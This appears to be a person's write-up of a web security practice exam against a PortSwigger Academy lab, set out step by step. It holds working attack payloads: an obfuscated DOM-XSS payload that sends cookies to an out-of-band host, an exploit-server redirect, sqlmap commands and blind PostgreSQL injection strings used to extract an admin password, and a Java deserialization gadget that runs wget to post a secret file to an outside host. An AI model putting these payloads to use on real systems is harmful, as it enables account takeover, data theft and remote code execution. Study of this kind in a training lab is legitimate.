Active Scan => DOM-XSS => "-alert(1)-"

dots are blocked => first bypass to get cookie => alert([document][cookie]) cannot exfiltrate data as dots are needed for the burp collab domain so we have to use atob to use it as base64.

Exploit:
"-eval(atob('ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ=='))-"

base64 part:
fetch('https://your.burp.oastify.com?cookie='+document.cookie)

Exploit server:
<script>
    document.location="https://LAB-ID.h1-web-security-academy.net/?SearchTerm=%22-eval(atob(%27ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ==%27))-%22czichiz"
</script>

Carlos account takeover!

Active scan on new advanced search feature only accessible with user account => PostgreSQL injection on param sort-by

PostgreSQL: PostgreSQL 12.14 (Ubuntu 12.14-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit 

Automatic with sqlmap:

sqlmap.py -u "https://LAB-ID.h1-web-security-academy.net:443/filtered_search?SearchTerm=test&sort-by=DATE&writer=" --cookie="_lab=48%7cMC4CFQCUigHc10K7RPnpgqQELxmnJC1XtAIVAIjxga6lfvULTXA5Pbqay2che1mf23VpCwRs7bp8k0P0WAnCIJh1MEhnSS%2b7xWrrVBgesSt08Mm7GHU6AMaFuhNMV79n6urUwKDt%2bvAmBTwIDGNzN3EcnM5lqarXKPo0JzTNR0i9BdZIvvAYXA%3d%3d; session=97xXNPN8LvO14nMh3tQLARSy47O67rgV" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36" --referer="https://0ad500100381b261800cf872003800f1.h1-web-security-academy.net/filtered_search?SearchTerm=test&sort-by=DATE&writer=" --delay=0 --timeout=30 --retries=0 -p "sort-by" --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --current-user

sqlmap find boolean-based SQLi

manual:
Detection with time-based blind SQLi:
sort-by=DATE;SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--

Find password lenght:
sort-by=DATE;SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>$20$)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--

20 cars

Find password:
sort-by=DATE;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,$1$,1)='$a$')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--

1234567891011121314151617181920
b9v9whchew y p e w t l 1 y g v

creds admin:
login: administrator
password: b9v9whchewypewtl1ygv

Administrator account takeover!

New feature => admin panel => delete users => list of blogs with title/author/views

checklist:

SQLi => possible - (no interactions on admin panel so only possibility in headers)
XXE => not possible cause no interactions on admin panel
SSRF => possible only in headers
OS injection => possible only on headers
Deserial => possible + (Cookie look java serialized)
File upload => not possible (no file upload feature)

View-source => clean 

exfiltration:

Insecure deserialization of admin-prefs cookie

H4sIAAAAAAAA%2fzWPPU7DQBCFF0RSQcMJpkOi2PTQEH4iCkcKClJEOV6Pk8HrHbO7dmKQOA4VJ%2bAI3IU7sBahm%2fn09PS9zx81Cl6dW8w1msjigjZS1%2bJ0IM9o%2bRVzS3pa1OwWnsrw9vUxDqvv7FAdZeq4xE48R5qJFFGdZs%2fY4cSiW0%2bW0bNbX2bq5D%2fz0EqkF%2fWuDvawHei1SLWHo7ih%2bi%2bxa6Iab5kc%2baiu5j04rAk4wA16KwHm4qL0qOFJWqjYWiqg7qHEVOE1JNMGPUEUKJh0VIvHDcGKcpg2jWWDw1K4R1ORPwvpcEWePC7gloORjgZ1SBDudo0VjsO7JDMI9zCzuA1JT3zaSb9PDWuHQgEAAA%3d%3d

extension Java deserialisation scanner => exploitation 

Compress using gzip + Encode using Base64 + Encode using URL encoding

Payload: CommonsCollections7 'wget https://your.burp.oastify.com --post-file=/home/carlos/secret'

Received request data => solution-NMN8OGrvOL0ehJ5wqoNWIGTWPwaTZZ8Z

/!\ Configure the path to the ysoserial.jar file in the extension config and use another version of ysoserial if that doesn't work.
/!\ HTTP/2 required

Practical Exam Completed !